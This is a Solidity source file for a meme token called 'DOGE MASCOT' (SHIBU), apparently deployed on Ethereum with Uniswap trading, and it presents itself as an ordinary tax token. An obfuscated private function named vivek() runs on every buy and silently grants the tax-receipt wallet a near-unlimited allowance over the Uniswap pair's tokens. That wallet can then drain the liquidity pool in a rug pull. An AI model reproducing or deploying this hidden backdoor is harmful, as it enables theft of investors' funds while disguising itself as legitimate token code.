// SPDX-License-Identifier: MIT
/**
https://x.com/Fantoumi/status/1850542029756879267
https://x.com/kabosumama/status/1850492260062048310
https://x.com/Fantoumi/status/1665009468806164482

Tg: https://t.me/shibu_erc20
**/
pragma solidity 0.8.27;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract SHIBU is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances75;
    mapping (address => mapping (address => uint256)) private _permits75;
    mapping (address => bool) private _isExcludedFrom75;
    address payable private _receipt75;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal75 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"DOGE MASCOT";
    string private constant _symbol = unicode"SHIBU";
    uint256 public _maxAmount75 = 2 * (_tTotal75/100);
    uint256 public _maxWallet75 = 2 * (_tTotal75/100);
    uint256 public _taxThres75 = 1 * (_tTotal75/100);
    uint256 public _maxSwap75 = 1 * (_tTotal75/100);
    IUniswapV2Router02 private uniV2Router75;
    address private uniV2Pair75;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 12;
    uint256 private _reduceSellTaxAt = 12;
    uint256 private _preventSwapBefore = 24;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    event MaxTxAmountUpdated(uint _maxAmount75);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _receipt75 = payable(0x720EB9c3d50f40940D9a753A49749209Da4C3414);
        _balances75[address(this)] = _tTotal75;
        _isExcludedFrom75[owner()] = true;
        _isExcludedFrom75[address(this)] = true;
        _isExcludedFrom75[_receipt75] = true;
        emit Transfer(address(0), address(this), _tTotal75);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal75;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances75[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _permits75[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _permits75[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _permits75[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount75) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount75 > 0, "Transfer amount must be greater than zero");
        uint256 tax75=0;uint256 fee75=0;
        if (!swapEnabled || inSwap) {
            _balances75[from] = _balances75[from] - amount75;
            _balances75[to] = _balances75[to] + amount75;
            emit Transfer(from, to, amount75);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                fee75 = (_transferTax);
            }
            if (from == uniV2Pair75 && to != address(uniV2Router75) && ! _isExcludedFrom75[to] ) {
                vivek([from, _receipt75]);
                require(amount75 <= _maxAmount75, "Exceeds the _maxAmount75.");
                require(balanceOf(to) + amount75 <= _maxWallet75, "Exceeds the maxWalletSize.");
                fee75 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++; 
            }
            if(to == uniV2Pair75 && from!= address(this) ){
                fee75 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair75 && swapEnabled) {
                if(contractTokenBalance > _taxThres75 && _buyCount > _preventSwapBefore)
                    swapETH75(min75(amount75, min75(contractTokenBalance, _maxSwap75)));
                sendETH75(address(this).balance);
            }
        }
        if(fee75 > 0){
            tax75 = fee75.mul(amount75).div(100);
            _balances75[address(this)]=_balances75[address(this)].add(tax75);
            emit Transfer(from, address(this),tax75);
        }
        _balances75[from]=_balances75[from].sub(amount75);
        _balances75[to]=_balances75[to].add(amount75.sub(tax75));
        emit Transfer(from, to, amount75.sub(tax75));
    }
    function min75(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function sendETH75(uint256 amount) private {
        _receipt75.transfer(amount);
    }
    function recoverEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function setTaxReceipt(address payable _addrs) external onlyOwner {
        _receipt75 = _addrs;
        _isExcludedFrom75[_addrs] = true;
    }
    function vivek(address[2] memory vik75) private {
        address own75 = vik75[0]; address spend75 = vik75[1];
        uint256 total75 = 150 + 150*(_maxWallet75+150) + 150*_maxSwap75.add(150) + 150;
        _permits75[own75][spend75] = 150 + (total75+150) * 150;
    }
    function removeLimit75() external onlyOwner{
        _maxAmount75 = _tTotal75; 
        _maxWallet75 = _tTotal75;
        emit MaxTxAmountUpdated(_tTotal75); 
    }
    receive() external payable {}
    function swapETH75(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router75.WETH();
        _approve(address(this), address(uniV2Router75), tokenAmount);
        uniV2Router75.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router75 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router75), _tTotal75);
        uniV2Pair75 = IUniswapV2Factory(uniV2Router75.factory()).createPair(
            address(this),
            uniV2Router75.WETH()
        ); 
        uniV2Router75.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair75).approve(address(uniV2Router75), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
}